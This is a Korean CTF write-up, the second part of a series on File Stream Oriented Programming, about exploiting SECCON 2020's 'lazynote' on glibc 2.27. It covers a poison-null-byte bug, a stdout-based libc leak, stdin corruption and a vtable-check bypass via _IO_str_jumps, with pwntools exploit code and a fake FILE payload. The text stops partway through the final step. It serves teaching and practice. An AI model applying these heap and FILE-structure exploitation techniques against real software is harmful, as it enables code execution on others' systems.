---
title: "FSOP(File Stream Oriented Programming) - (2)[en]"
date : 2025-12-05 00:00:00 +0900
categories: [Pwnable, Heap, FSOP, ]
tags : [fsop , pwn , glibc , file-structure , stream , IO , vtable]
---


## FSOP

[FIle Structure Analyze]
===Part 2=== How to use for attack 


## SECCONCTF 2020 - lazynote

Part 1 에서 FILE구조체 형식과 vtable에 대해 살펴보고 puts함수를 통해 간단하게 IO 라이브러리를 통해 어떤 흐름으로 시스템콜이 호출되었는지 살펴보았다.

이번에는 SECCONCTF2020에 나왔던 lazynote를 통해 2.24이후 추가된 vtable검증과 시스템콜을 위한 여러 조건들을 살펴보면서 어떤식으로 공격이 이루어지는지 상세히 살펴보자.


## 문제 환경

file : ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a1663726383f8586f276451381e6fbb6f3d2d675, not stripped

sec : 
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No

libc : GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27.


## 분석


main 함수

```c
undefined8 main(void)

{
  int chance;
  
  setbuf(stdin,(char *)0x0);
  setbuf(stdout,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  alarm(300);
  puts("s_<_Hi");
  for (chance = 0; chance < 4; chance = chance + 1) {
    babyheap();
  }
  puts(s_<_Bye);
  return 0;
}
```


main함수에서 4번의 기회로 babyheap()을 호출한다.

babyheap 함수

```c


void babyheap(void)

{
  int choose_and_alloc;
  int read_size;
  
  choose_and_alloc = menu();
  if (choose_and_alloc == 1) {
    choose_and_alloc = readint("alloc size: ");
    if (choose_and_alloc < 1) {
      puts(s_invalid_size_00100c87);
    }
    else {
      read_size = readint("read size: ");
      if (read_size < 1) {
        puts(s_invalid_size_00100c87);
      }
      else {
        ptr = (undefined *)calloc(1,(long)choose_and_alloc);
        if (ptr == (undefined *)0x0) {
          puts(s_memory_error_00100ca5);
                    /* WARNING: Subroutine does not return */
          exit(1);
        }
        if (read_size <= choose_and_alloc) {
          choose_and_alloc = read_size;
        }
        readline("data: ",ptr,choose_and_alloc);
        ptr[(long)read_size + -1] = 0;
      }
    }
  }
  else if ((choose_and_alloc < 1) || (4 < choose_and_alloc)) {
    puts(s_invalid_choice_00100cd3);
  }
  else {
    puts(s_not_implemented_00100cbe);
  }
  return;
}

```


menu에는 총 4개의 메뉴가 있지만 2,3,4메뉴는 작동하지않고 1번 메뉴만 작동한다.
1번 메뉴에서는 사용자의 size입력을 받고 그 크기만큼 calloc함수를 이용해 할당하고 ptr에 저장하게된다.


문제는 ptr[(long)read_size + -1] 부분에서 원래 의도는 입력 받은 데이터 마지막에 \x00값을 넣는거지만 read_size가 choose_and_alloc 의 크기보다 크다면 우리가 원하는 위치에 \x00의 데이터를 하나 넣을수있다(poison null byte).


calloc함수를 할당할때 일정 크기이상을 주면 heap영역의 공간확장이 더는 불가능할때 mmap으로 별도의 영역에 할당하게되면서 libc주소랑 가까워지게 배치를 할수있다.


이 외에는 딱히 취약점이 없어 보인다.
그럼 현재 사용가능한 기능은 총 4번의 alloc(size)를 하고 원하는 위치에 \x00의 데이터를 넣을수있다는 사실인데 익스플로잇을 위해 leak을 어떤식으로 할지 알아보자.


## How to leak

이전에 살펴보았던 puts 함수의 호출에서 우리는 vtable을 참조해 _IO_new_file_xsputn을 호출한다는것을 알았다.


_IO_new_file_xsputn에서 4개의 분기점을 살펴보자.



(1) if (n <= 0)
출력 데이터 길이가 0이하인경우 함수를 종료시킴

(2)  if ((f->_flags & _IO_LINE_BUF) && (f->_flags & _IO_CURRENTLY_PUTTING))
flag설정 확인, 현재 라인 버퍼 모드인지, 현재 쓰기작업중인지.

(3) if (count > 0) 
이후 쓸 데이터보다 _IO_write_end - _IO_write_ptr이 크다면 큰만큼 버퍼에 데이터를 복사한다.

(4) if (to_do + must_flush > 0)
must_flush값은 출력할 문자열에 '\n' 값 개수에 따라 달라짐. 


시스템콜이 호출되는부분은 1-2-3-4순으로 거친후 4번째 분기점이후에 호출된다.

### _IO_new_file_xsputn

```c
if (to_do + must_flush > 0)
    {
      size_t block_size, do_write;
      /* Next flush the (full) buffer. */
      if (_IO_OVERFLOW (f, EOF) == EOF)
	/* If nothing else has to be written we must not signal the
	   caller that everything has been written.  */
	return to_do == 0 ? EOF : n - to_do;
      /* Try to maintain alignment: write a whole number of blocks.  */
      block_size = f->_IO_buf_end - f->_IO_buf_base;
      do_write = to_do - (block_size >= 128 ? to_do % block_size : 0);
      if (do_write)
	{
	  count = new_do_write (f, s, do_write);
	  to_do -= count;
	  if (count < do_write)
	    return n - to_do;
	}
      /* Now write out the remainder.  Normally, this will fit in the
	 buffer, but it's somewhat messier for line-buffered files,
	 so we let _IO_default_xsputn handle the general case. */
      if (to_do)
	to_do -= _IO_default_xsputn (f, s+do_write, to_do);
    }

```

그 이후에 _IO_OVERFLOW함수를 부르게되는데 _IO_2_1_stdout_의 *vtable __oveflow에서 _IO_new_file_overflow함수로 호출되는것을 알수있다.


### _IO_new_file_overflow 

```c
_IO_new_file_overflow (FILE *f, int ch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    ...
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
    ... // 


  if (ch == EOF) /* */
    return _IO_do_write (f, f->_IO_write_base,
			 f->_IO_write_ptr - f->_IO_write_base);
  if (f->_IO_write_ptr == f->_IO_buf_end ) /* Buffer is really full */
    if (_IO_do_flush (f) == EOF)
      return EOF;
  *f->_IO_write_ptr++ = ch;
  if ((f->_flags & _IO_UNBUFFERED)
      || ((f->_flags & _IO_LINE_BUF) && ch == '\n'))
    if (_IO_do_write (f, f->_IO_write_base,
		      f->_IO_write_ptr - f->_IO_write_base) == EOF)
      return EOF;
  return (unsigned char) ch;
}
libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)
```

현재 flags는 출력 모드로 설정되어있고 _IO_write_base는 null값이 아니다.

첫번째와 두번째 조건 모드 충족되지않으므로 패스하고 함수를 호출할때 ch값은 EOF로 설정되므로 _IO_do_write함수를 호출하고 _IO_do_write함수의 리턴값을 리턴함으로써 종료된다.


### _IO_new_do_write 

```c
_IO_new_do_write (FILE *fp, const char *data, size_t to_do)
{
  return (to_do == 0
	  || (size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;
}
libc_hidden_ver (_IO_new_do_write, _IO_do_write)

```

data로 f->_IO_write_base 주소가 들어가고 to_do값으로 f->_IO_write_ptr - f->_IO_write_base 가 들어가게된다.

여기서 프로그램의 메모리를 살펴보면 _IO_2_1_stdout_의 _IO_file 구조체에 값은 아래와 같이 있다.

```

_flags = -72537977,
    _IO_read_ptr = 0x7ffff7e04643 <_IO_2_1_stdout_+131> "\n",
    _IO_read_end = 0x7ffff7e04643 <_IO_2_1_stdout_+131> "\n",
    _IO_read_base = 0x7ffff7e04643 <_IO_2_1_stdout_+131> "\n",
    _IO_write_base = 0x7ffff7e04643 <_IO_2_1_stdout_+131> "\n",
    _IO_write_ptr = 0x7ffff7e04643 <_IO_2_1_stdout_+131> "\n",
    _IO_write_end = 0x7ffff7e04643 <_IO_2_1_stdout_+131> "\n",
    _IO_buf_base = 0x7ffff7e04643 <_IO_2_1_stdout_+131> "\n",
    _IO_buf_end = 0x7ffff7e04644 <_IO_2_1_stdout_+132> "",

```

프로그램초기에 setbuf로 stdin,stdout,stderr을 모두 0으로 초기화하기때문에 모두 같은값이 들어가있다. _IO_buf_end는 +0x1값으로.

원래대로라면 to_do값이 0으로 들어가 new_do_write함수가 호출되지않고 0을 리턴값으로 주게된다.

하지만 우리가 1byte null 값을 원하는곳에 쓸수있는데 이걸 이용해서 f->_IO_write_base의 끝값을 덮는다면 to_do값을 0x7ffff7e04643-0x7ffff7e04600 = 0x43만큼 설정할수있다.

new_do_write(fp, data, to_do)를 호출하고 리턴값이 to_do랑 같은지 비교해서 같으면 0 다르면 EOF를 리턴한다.

### new_do_write 

```c
new_do_write (FILE *fp, const char *data, size_t to_do)
{
  size_t count;
  if (fp->_flags & _IO_IS_APPENDING)
    /* On a system without a proper O_APPEND implementation,
       you would need to sys_seek(0, SEEK_END) here, but is
       not needed nor desirable for Unix- or Posix-like systems.
       Instead, just indicate that offset (before and after) is
       unpredictable. */
    fp->_offset = _IO_pos_BAD;  // define _IO_pos_BAD ((off64_t) -1)
  else if (fp->_IO_read_end != fp->_IO_write_base)
    {
      off64_t new_pos
	= _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
      if (new_pos == _IO_pos_BAD)
	return 0;
      fp->_offset = new_pos;
    }
  count = _IO_SYSWRITE (fp, data, to_do);
  if (fp->_cur_column && count)
    fp->_cur_column = _IO_adjust_column (fp->_cur_column - 1, data, count) + 1;
  _IO_setg (fp, fp->_IO_buf_base, fp->_IO_buf_base, fp->_IO_buf_base);
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_buf_base;
  fp->_IO_write_end = (fp->_mode <= 0
		       && (fp->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
		       ? fp->_IO_buf_base : fp->_IO_buf_end);
  return count;
}

```

그렇게 _IO_write_base를 조작하고 new_do_write()함수를 호출하면 else if 조건문에서 걸리면서 _IO_SYSEEK함수를 호출하는데 인자로 fp->_IO_write_base - fp->_IO_read_end 값을 넣는데 이게 음수로 들어가면서 에러를 뱉고 종료된다(IO_pos_BAD == -1).

이 조건을 피하기위해 _IO_read_end값도 같이 null byte로 덮어서 똑같이 만들게한다.

결국 else if 조건문도 통과하고 _IO_SYSWRITE함수를 호출하는데 _IO_2_1_stdout_ *vtable 에서 __write위치의 _IO_new_file_write함수를 호출하게된다.

### _IO_new_file_write 

```c

_IO_new_file_write  (FILE *f, const void *data, ssize_t n)
{
  ssize_t to_do = n;
  while (to_do > 0)
    {
      ssize_t count = (__builtin_expect (f->_flags2
                                         & _IO_FLAGS2_NOTCANCEL, 0)
			   ? __write_nocancel (f->_fileno, data, to_do)
			   : __write (f->_fileno, data, to_do));
      if (count < 0)
	{
	  f->_flags |= _IO_ERR_SEEN;
	  break;
	}
      to_do -= count;
      data = (void *) ((char *) data + count);
    }
  n -= to_do;
  if (f->_offset >= 0)
    f->_offset += n;
  return n;
}


```

위에서 봤던 data에는 _IO_2_1_stdout_ -> _IO_write_base 의 주소가 to_do에는 f->_IO_write_ptr - f->_IO_write_base의 값이 설정되어 출력을 하게된다.

gdb로 조작된 _IO_write_base의 데이터를 살펴보자.

```

pwndbg> x/12x 0x7ffff7e04600
0x7ffff7e04600 <_IO_2_1_stdout_+64>:    0x00007ffff7e04644      0x0000000000000000
0x7ffff7e04610 <_IO_2_1_stdout_+80>:    0x0000000000000000      0x0000000000000000
0x7ffff7e04620 <_IO_2_1_stdout_+96>:    0x0000000000000000      0x00007ffff7e038e0
0x7ffff7e04630 <_IO_2_1_stdout_+112>:   0x0000000000000001      0xffffffffffffffff


pwndbg> x/x 0x00007ffff7e038e0
0x7ffff7e038e0 <_IO_2_1_stdin_>:        0x00000000fbad208b

```

라이브러리주소를 얻을수있다.


### step to leak

다시 정리를 해보자면 우리의 목표는 1byte poison null byte 취약점을 이용해서 

(1) _IO_new_do_write()의 조건을 패스하기위해 _IO_write_base값을 조작한다. 

(2) new_do_write()의 _IO_SYSSEEK()로 빠지는걸 피하기위해 _IO_read_end값도 조작한다.

(3) 조작이 완료되면 puts함수가 호출될때 _IO_overflow를 호출하면서 조작된 크기만큼의 버퍼를 _IO_write_base위치의 데이터부터 출력하게된다.



```python

from pwn import *

p=process("./chall")
libc=ELF("./libc-2.27.so")
e=ELF("./chall")



def send(size,idx,data):
    p.sendlineafter(">","1")
    p.sendlineafter(":",str(size))
    p.sendlineafter(":",str(idx))
    p.sendlineafter(":",data)

#write_Base => 0
send(2097152,6215504+33,"A")

#read_end => 0
#send(0x200000,0x6065B0+17,"B")
p.sendline("1")
p.sendline(str(2097152))
p.sendline(str(8316769))
p.sendline("A")

#leak _IO_2_1_stdout_+132
p.recv(1)
p.recv(32)
#leak_stdfile=u64(p.recv(6)+b'\x00'*2)-0x
leak_stdout=u64(p.recv(6)+b'\x00'*2)+0xfe0

libc_main = leak_stdout - libc.sym['_IO_2_1_stdout_']
stdin=libc_main+libc.sym['_IO_2_1_stdin_']
one_gadget = libc_main + 0x4f35e
binsh=libc_main +0x1b40fa
system = libc_main+libc.sym['system']
#lock=libc_main+libc.sym['_IO_stdfile_1_lock']
lock=leak_stdout+0x1160
#wide_data=libc_main+libc.sym['_IO_wide_data_1']
wide_data = leak_stdout-0xea0
#str_jumps=libc_main+libc.sym['_IO_str_jumps']
str_jumps=leak_stdout-0x4400

```

```

[*] '/ctf/libc-2.27.so'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 5)
[*] '/ctf/chall'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
[*] leak_stdout => 0x710ba698f760
[*] stdin => 0x710ba698ea00
[*] libc_main => 0x710ba65a3000
[*] system => 0x710ba65f24e0
[*] binsh => 0x710ba67570fa
[*] str_jumps => 0x710ba698b360
[*] lock => 0x710ba69908c0
[*] wide_data => 0x710ba698e8c0

```

이런식으로 FILE구조체를 조작해서 버퍼가 없어도 메모리 내용들을 출력할수있게했다.
그럼 프로그램에 입력을 받는 fgets함수를 이용해서 우리가 원하는 주소에도 데이터를 쓸수있지않을까?

## Use stdin to exploit



### fgets



```c

_IO_fgets (char *buf, int n, FILE *fp)
{
  size_t count;
  char *result;
  int old_error;
  CHECK_FILE (fp, NULL);
  if (n <= 0)
    return NULL;
  if (__glibc_unlikely (n == 1))
    {
      /* Another irregular case: since we have to store a NUL byte and
	 there is only room for exactly one byte, we don't have to
	 read anything.  */
      buf[0] = '\0';
      return buf;
    }
  _IO_acquire_lock (fp);
  /* This is very tricky since a file descriptor may be in the
     non-blocking mode. The error flag doesn't mean much in this
     case. We return an error only when there is a new error. */
  old_error = fp->_flags & _IO_ERR_SEEN;
  fp->_flags &= ~_IO_ERR_SEEN;
  count = _IO_getline (fp, buf, n - 1, '\n', 1);
  /* If we read in some bytes and errno is EAGAIN, that error will
     be reported for next read. */
  if (count == 0 || ((fp->_flags & _IO_ERR_SEEN) && errno != EAGAIN))
    result = NULL;
  else
    {
      buf[count] = '\0';
      result = buf;
    }
  fp->_flags |= old_error;
  _IO_release_lock (fp);
  return result;
}

```

size가 1보다 크면 조건문을 모두 패스하고 _IO_getline을 호출하게된다.


### _IO_getline


```c

_IO_getline (FILE *fp, char *buf, size_t n, int delim,
	     int extract_delim) // n=n-1 , delim = '\n' , extract_delim = 1
{
  return _IO_getline_info (fp, buf, n, delim, extract_delim, (int *) 0);
}

```

다시 _IO_getline_info를 호출한다.


### _IO_getline_info

```c

 (FILE *fp, char *buf, size_t n, int delim,
		  int extract_delim, int *eof)
{
  char *ptr = buf;
  if (eof != NULL)
    *eof = 0;
  if (__builtin_expect (fp->_mode, -1) == 0)
    _IO_fwide (fp, -1);
  while (n != 0)
    {
      ssize_t len = fp->_IO_read_end - fp->_IO_read_ptr; // len < 0
      if (len <= 0)
	      {
	        int c = __uflow (fp);
	        if (c == EOF)
	        {
	          if (eof)
		          *eof = c;
	          break;
	        }
	    
      ...
}
libc_hidden_def (_IO_getline_info)

```

앞에서 _IO_read_end의 1byte를 \x00으로 써서 len = fp->_IO_read_end - fp->_IO_read_ptr 의 크기는 0보다 작아지게되어서 조건문을 통과하고 __uflow를 호출한다.

_IO_2_1_stdin_ *vtable -> __uflow 는 __GI__IO_default_uflow 을 호출한다.


### _IO_default_uflow

```c

int
_IO_default_uflow (FILE *fp)
{
  int ch = _IO_UNDERFLOW (fp);
  if (ch == EOF)
    return EOF;
  return *(unsigned char *) fp->_IO_read_ptr++;
}
libc_hidden_def (_IO_default_uflow)

```

그리고 _IO_UNDERFLOW를 호출한다. -> _IO_new_file_underflow()


### _IO_new_File_underflow()

```c

_IO_new_file_underflow (FILE *fp)
{
  ssize_t count;
  /* C99 requires EOF to be "sticky".  */
  if (fp->_flags & _IO_EOF_SEEN)
    return EOF;
  if (fp->_flags & _IO_NO_READS)
    {
      fp->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
  if (fp->_IO_read_ptr < fp->_IO_read_end)
    return *(unsigned char *) fp->_IO_read_ptr;
  if (fp->_IO_buf_base == NULL)
    {
      /* Maybe we already have a push back pointer.  */
      if (fp->_IO_save_base != NULL)
	{
	  free (fp->_IO_save_base);
	  fp->_flags &= ~_IO_IN_BACKUP;
	}
      _IO_doallocbuf (fp);
    }
  /* FIXME This can/should be moved to genops ?? */
  if (fp->_flags & (_IO_LINE_BUF|_IO_UNBUFFERED))
    {
      /* We used to flush all line-buffered stream.  This really isn't
	 required by any standard.  My recollection is that
	 traditional Unix systems did this for stdout.  stderr better
	 not be line buffered.  So we do just that here
	 explicitly.  --drepper */
      _IO_acquire_lock (stdout);
      if ((stdout->_flags & (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))
	  == (_IO_LINKED | _IO_LINE_BUF))
	_IO_OVERFLOW (stdout, EOF);
      _IO_release_lock (stdout);
    }
  _IO_switch_to_get_mode (fp);
  /* This is very tricky. We have to adjust those
     pointers before we call _IO_SYSREAD () since
     we may longjump () out while waiting for
     input. Those pointers may be screwed up. H.J. */
  fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;
  fp->_IO_read_end = fp->_IO_buf_base;
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end
    = fp->_IO_buf_base;
  count = _IO_SYSREAD (fp, fp->_IO_buf_base,
		       fp->_IO_buf_end - fp->_IO_buf_base);
  if (count <= 0)
    {
      if (count == 0)
	fp->_flags |= _IO_EOF_SEEN;
      else
	fp->_flags |= _IO_ERR_SEEN, count = 0;
  }
  fp->_IO_read_end += count;
  if (count == 0)
    {
      /* If a stream is read to EOF, the calling application may switch active
	 handles.  As a result, our offset cache would no longer be valid, so
	 unset it.  */
      fp->_offset = _IO_pos_BAD;
      return EOF;
    }
  if (fp->_offset != _IO_pos_BAD)
    _IO_pos_adjust (fp->_offset, count);
  return *(unsigned char *) fp->_IO_read_ptr;
}
libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)

```

flag값을 원래 stdin 사용시 사용되는 값으로 고정하면 모든 if문을 패스하고 _IO_SYSREAD (fp, fp->_IO_buf_base, fp->_IO_buf_end - fp->_IO_buf_base);을 호출하는걸 볼수있다.

즉 _IO_buf_base와 _IO_buf_end를 적절히 조작하면 우리가 원하는 위치에 데이터를 쓸수있다.

glibc 2.27에서의 _IO_2_1_stdin_ 메모리 상태를 보면 _IO_buf_end주소에 _IO_buf_base = 0x7ffff7dcda83 <_IO_2_1_stdin_+131> 이 값이 있다.

1byte를 \x00으로 덮으면 _IO_2_1_stdin_ 의 구조체 데이터들을 조작할수있다.

(gdb) x/12gx 0x7ffff7dcda00
0x7ffff7dcda00 <_IO_2_1_stdin_>:        0x00000000fbad208b      0x00007ffff7dcda83

_IO_read_ptr > _IO_read_base 조건만 신경써서 조작하면 무난히 원하는 위치에 데이터를 쓸수있을꺼같다.

그런데 우리는 기회가 4번이고 앞서 leak을 하면서 2번의 기회를 사용했고 지금 _IO_2_1_stdin_ 조작을 위해 1번을 쓰게되면 추가 입력과 프로그램상 남은 마지막 1번의 기회만 남게된다.

4번의 입력기회가 끝나면 puts()함수를 호출하고 종료하게되어서 출력 구조체 _IO_2_1_stdout_의 vtable조작을 해서 one_gadget이나 system함수를 호출하도록해보자.
이 과정에서 glibc 2.27+ 환경이라 vtable 검증 우회가 필요하다.


### Make base for exploit

정리하자면 

(1) _IO_bufe_base_의 1byte를 \x00으로 덮으면서 stdin구조체 조작을 가능하게한다.

(2) _IO_bufe_base가 _IO_2_1_stdin_구조체의 주소를 가르키게 되면 0x83크기만큼의 데이터를 더 쓸수있게된다.

(3) _IO_read_ptr > _IO_read_base를 만족하면서 stdin구조체 조작을 통해 쓰기를 원하는 주소의 위치를 _IO_buf_base와 원하는 크기만큼 더해서 _IO_buf_end를 조작한다.

(4) 조작된 데이터를 입력하면 기회는 1번 남기때문에 puts()함수에서 stdout 호출을 통해 exploit을 하기위해 stdout의 구조체 데이터들을 조작한다.

```python

#_IO_buf_base 1byte => 0x0
send(2097152,10414633,"A")

#FAKE FILE
pay=p64(0xfbad208b)  #flag default setting
pay+=p64(stdin)  #_IO_read_ptr
pay+=p64(0)   #_IO_read_base
pay+=p64(stdin)*4
pay+=p64(leak_stdout)  #_IO_buf_base
pay+=p64(leak_stdout+0x1000)   #_IO_buf_end
pay=pay.ljust(0x84,b'\x00')
p.sendline(pay)

```


이렇게되면 우리는 fgets()를 마지막으로 한번 쓸수있고 쓰게되는 위치는 _IO_2_1_stdout_의 데이터들이고 총 0x1000만큼 쓸수있게된다.


## GLIBC 2.27+ vtable pointer validation

stdout을 이용해서 puts()를 호출할때 vtable의 데이터들 조작해서 vtable을 참조해서 _IO_overflow() 같은 함수를 호출할때 system이나 one_gadget으로 덮어 쉘을 실행시키도록 할 예정이였다.

하지만 2.27이상 버전부터는 vtable 주소에대해 유효한 주소값인지 검증하는 로직이 추가되었다.

glibc/libio/libioP.h:1027
```c

static inline const struct _IO_jump_t *
IO_validate_vtable (const struct _IO_jump_t *vtable)
{
  uintptr_t ptr = (uintptr_t) vtable;
  uintptr_t offset = ptr - (uintptr_t) &__io_vtables;
  if (__glibc_unlikely (offset >= IO_VTABLES_LEN))
    /* The vtable pointer is not in the expected section.  Use the
       slow path, which will terminate the process if necessary.  */
    _IO_vtable_check ();
  return vtable;
}
```

vtable의 주소가 유효한 offset범위내인지 검증을한다.
그러므로 우리는 메모리상의 조작된 vtable이 아닌 만들어진 유효한 vtables주소중 하나를 조작해서 쉘을 실행시켜야한다.

glibc에서 정의되어있는 테이블의 종류는 다음과 같다(glibc 버전별로 조금 다르다.)

glibc/libio/libioP.h.html:513   ==(GLIBC 2.27 version)==
```c

extern const struct _IO_jump_t _IO_file_jumps;
libc_hidden_proto (_IO_file_jumps)
extern const struct _IO_jump_t _IO_file_jumps_mmap attribute_hidden;
extern const struct _IO_jump_t _IO_file_jumps_maybe_mmap attribute_hidden;
extern const struct _IO_jump_t _IO_wfile_jumps;
libc_hidden_proto (_IO_wfile_jumps)
extern const struct _IO_jump_t _IO_wfile_jumps_mmap attribute_hidden;
extern const struct _IO_jump_t _IO_wfile_jumps_maybe_mmap attribute_hidden;
extern const struct _IO_jump_t _IO_old_file_jumps attribute_hidden;
extern const struct _IO_jump_t _IO_streambuf_jumps;
extern const struct _IO_jump_t _IO_old_proc_jumps attribute_hidden;
extern const struct _IO_jump_t _IO_str_jumps attribute_hidden;
extern const struct _IO_jump_t _IO_wstr_jumps attribute_hidden;

```

시간이되면 모두 보고 어떤 함수들을 호출하고 어떤구조인지 보고싶지만.. 우리에겐 시간이 소중하다. 

FSOP공격 기법에서 vtable우회를 하기위해 사용될 구조체는 _IO_str_jumps이다.

### why _IO_str_jumps

glibc/libio/vtables.c.html:95
```c

  /* _IO_str_jumps  */
  [IO_STR_JUMPS] =
  {
    JUMP_INIT_DUMMY,
    JUMP_INIT (finish, _IO_str_finish),
    JUMP_INIT (overflow, _IO_str_overflow),
    JUMP_INIT (underflow, _IO_str_underflow),
    JUMP_INIT (uflow, _IO_default_uflow),
    JUMP_INIT (pbackfail, _IO_str_pbackfail),
    JUMP_INIT (xsputn, _IO_default_xsputn),
    JUMP_INIT (xsgetn, _IO_default_xsgetn),
    JUMP_INIT (seekoff, _IO_str_seekoff),
    JUMP_INIT (seekpos, _IO_default_seekpos),
    JUMP_INIT (setbuf, _IO_default_setbuf),
    JUMP_INIT (sync, _IO_default_sync),
    JUMP_INIT (doallocate, _IO_default_doallocate),
    JUMP_INIT (read, _IO_default_read),
    JUMP_INIT (write, _IO_default_write),
    JUMP_INIT (seek, _IO_default_seek),
    JUMP_INIT (close, _IO_default_close),
    JUMP_INIT (stat, _IO_default_stat),
    JUMP_INIT (showmanyc, _IO_default_showmanyc),
    JUMP_INIT (imbue, _IO_default_imbue)
  },

```

그리고 IO_str_jumps는 _IO_strfile_구조체로 정의가된다.


우리가 _IO_str_jumps에 주목해야하는 이유는 overflow위치에 있는 _IO_str_overflow함수의 동작때문이다.


### _IO_str_overflow 


```c

int
_IO_str_overflow (_IO_FILE *fp, int c)
{
  int flush_only = c == EOF;
  _IO_size_t pos;
  if (fp->_flags & _IO_NO_WRITES)
      return flush_only ? 0 : EOF;
  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
    {
      fp->_flags |= _IO_CURRENTLY_PUTTING;
      fp->_IO_write_ptr = fp->_IO_read_ptr;
      fp->_IO_read_ptr = fp->_IO_read_end;
    }
  pos = fp->_IO_write_ptr - fp->_IO_write_base;
  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
    {
      if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
	return EOF;
      else
	{
	  char *new_buf;
	  char *old_buf = fp->_IO_buf_base;
	  size_t old_blen = _IO_blen (fp);
	  _IO_size_t new_size = 2 * old_blen + 100;
	  if (new_size < old_blen)
	    return EOF;
	  new_buf
	    = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size); //[step1]
	  
    
    ...
}
libc_hidden_def (_IO_str_overflow)

```

step1 부분을보면 (*(_IO_strfile *))fp->_s._allocate_buffer(new_size)로 함수를 호출하는것을 볼수있다.

### _IO_strfile

우리가 앞에서 봤던 file구조체는 아래와 같이 FILE구조체와 vtable로 구성되어있다.
```c

struct _IO_streambuf
{
  struct _IO_FILE _f;
  const struct _IO_jump_t *vtable;
};

```

그런데 위에서 _IO_str_jumps의 _IO_str_overflow함수에서 fp의 함수를 호출할때 _IO_strfile구조체 형식으로 호출하는것을 볼수있는데 아래는 _IO_strfile의 구조체이다.

```c
typedef struct _IO_strfile_
{
  struct _IO_streambuf _sbf;
  struct _IO_str_fields _s;
} _IO_strfile;

```

위에서 봤던 구조체에 _IO_str_fields 구조체가 추가된걸 알수있다.

```c

struct _IO_str_fields
{
  _IO_alloc_type _allocate_buffer;
  _IO_free_type _free_buffer;
};

```

_IO_str_fields에는 _IO_str_overflow()함수 내부에서 (*(_IO_strfile *))fp->_s._allocate_buffer(new_size) 이런식으로 호출되는 _allocate_buffer의 데이터가있다.

이부분을 gadget이나 system으로 덮으면 될꺼같다.

glibc가 업데이트되면서 (*(_IO_strfile *))fp->_s._allocate_buffer(new_size) 여기의 코드는 malloc()함수로 바뀌게된다.


전체적인 _IO_str_jumps의 구조

```c

{ _sbf = 
  {
    _f =  { _flags = 0, 
      _IO_read_ptr = 0, 
      _IO_read_end = 03777776751621240, 
      _IO_read_base = 03777776751617420,
      _IO_write_base = 03777776751617260,
      _IO_write_ptr = 03777776751601560, 
      _IO_write_end = 03777776751621200, 
      _IO_buf_base = 03777776751601720,
      _IO_buf_end = 03777776751602600, 
      _IO_save_base = 03777776751621720, 
      _IO_backup_base = 03777776751604500, 
      _IO_save_end = 03777776751604020,
      _markers = 03777776751606000, 
      _chain = 03777776751604660,
      _fileno = 036751616540, 
      _flags2 = 077777, 
      _old_offset = 03777776751616560,
      _cur_column = 016500, 
      _vtable_offset = 0247, 
      _shortbuf = {0367}, 
      _lock = 03777776751606000, 
      _offset = 03777776751616520,
      _codecvt = 03777776751616600, 
      _wide_data = 03777776751616620, 
      _freeres_list = 0, 
      _freeres_buf = 0, 
      __pad5 = 0, 
      _mode = 0, 
      _unused2 = {0 <repeats 12 times>, 0240, 042, 0247, 0367, 0377, 0177, 0, 0}
    }, 
    
    vtable = 03777776754236600}, 
  _s = {
    _allocate_buffer_unused = 03777776751617260, 
    _free_buffer_unused = 03777776751601560}
}


```


그럼 이제 _s의 _allocate_buffer_unused 위치에 system을 써야한다는걸 알았고 binsh를 (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size); 의 new_size에 넣을려면 앞에서 조건을 조금 맞춰줘야한다.


### binsh for newsize

```c

_IO_str_overflow (_IO_FILE *fp, int c)
{
  int flush_only = c == EOF;
  _IO_size_t pos;
  if (fp->_flags & _IO_NO_WRITES) //1
      return flush_only ? 0 : EOF;
  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING)) //2
    {
      fp->_flags |= _IO_CURRENTLY_PUTTING;
      fp->_IO_write_ptr = fp->_IO_read_ptr;
      fp->_IO_read_ptr = fp->_IO_read_end;
    }
  pos = fp->_IO_write_ptr - fp->_IO_write_base;
  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only)) //3
    {
      if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
	return EOF;
      else
	{
	  char *new_buf;
	  char *old_buf = fp->_IO_buf_base;
	  size_t old_blen = _IO_blen (fp);
	  _IO_size_t new_size = 2 * old_blen + 100; //4
	  if (new_size < old_blen)
	    return EOF;
	  new_buf
	    = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);

```

_IO_str_overflow함수를 if문 순서대로 따라가보자.

1 : fp-_flags값에 _IO_NO_WRITES(0x0008)를 확인하는데 기본 flag값은 0xfbad2887이므로 여기는 그냥 패스한다.

